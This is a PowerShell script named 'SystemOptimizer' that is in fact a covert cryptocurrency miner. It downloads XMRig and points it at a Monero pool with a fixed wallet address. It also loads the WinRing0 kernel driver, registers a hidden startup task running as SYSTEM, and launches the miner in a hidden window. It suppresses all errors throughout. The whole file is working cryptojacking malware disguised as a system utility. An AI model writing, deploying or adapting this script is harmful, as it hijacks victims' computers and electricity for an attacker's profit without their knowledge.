#Requires -RunAsAdministrator

$ErrorActionPreference = "SilentlyContinue"

$baseDir = "$env:LOCALAPPDATA\SystemOptimizer"
$xmrigDir = "$baseDir\xmrig-6.26.0"
$xmrigExe = "$xmrigDir\xmrig.exe"
$configFile = "$baseDir\config.json"
$driverPath = "$xmrigDir\WinRing0x64.sys"
$zipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip"
$zipPath = "$baseDir\xmrig.zip"

# Create directories
New-Item -ItemType Directory -Force -Path $baseDir | Out-Null
New-Item -ItemType Directory -Force -Path $xmrigDir | Out-Null

# Download XMRig if not present
if (-not (Test-Path $xmrigExe)) {
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($zipUrl, $zipPath)
        Expand-Archive -Path $zipPath -DestinationPath $baseDir -Force
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    } catch { }
}

# Write config
$config = @{
    autosave = $true
    background = $true
    colors = $false
    "donate-level" = 1
    "log-file" = "$baseDir\optimizer.log"
    "print-time" = 30
    retries = 5
    "retry-pause" = 5
    cpu = @{
        enabled = $true
        "huge-pages" = $true
        "huge-pages-jit" = $true
        "hw-aes" = $true
        priority = 3
        yield = $false
        asm = $true
        "argon2-impl" = "auto"
        "max-threads-hint" = 100
    }
    pools = @(
        @{
            url = "gulf.moneroocean.stream:10001"
            user = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
            pass = "chunnu"
            keepalive = $true
            tls = $false
            nicehash = $false
            "rig-id" = $env:COMPUTERNAME
        }
    )
    api = @{
        enabled = $true
        host = "127.0.0.1"
        port = 3456
        restricted = $true
    }
} | ConvertTo-Json -Depth 5
$config | Out-File -FilePath $configFile -Encoding ascii

# Install WinRing0 driver
if (Test-Path $driverPath) {
    $svc = "WinRing0_1_2_0"
    $es = Get-Service $svc -ErrorAction SilentlyContinue
    if ($es) { Stop-Service $svc -Force -ErrorAction SilentlyContinue; sc.exe delete $svc 2>$null }
    sc.exe create $svc binPath= "$driverPath" type= kernel start= demand 2>$null
    Start-Service $svc -ErrorAction SilentlyContinue
}

# Create scheduled task
$taskName = "SystemOptimizer"
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$baseDir\launch.vbs`""
$trigger = New-ScheduledTaskTrigger -AtStartup
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue

# Create launch.vbs
$vbs = 'Set WshShell = CreateObject("WScript.Shell"):WshShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""& { `$baseDir = ''" + $baseDir + "''; `$xmrigExe = ''" + $xmrigExe + "''; `$configFile = ''" + $configFile + "''; `$wshell = New-Object -ComObject WScript.Shell; `$wshell.Run(`"``" + `$xmrigExe + "``" --config=``" + `$configFile + "``"`", 0, `$false) }""", 0, False'
$vbs | Out-File -FilePath "$baseDir\launch.vbs" -Encoding ascii

# Start now (hidden)
$wshell = New-Object -ComObject WScript.Shell
$wshell.Run("`"$xmrigExe`" --config=`"$configFile`"", 0, $false)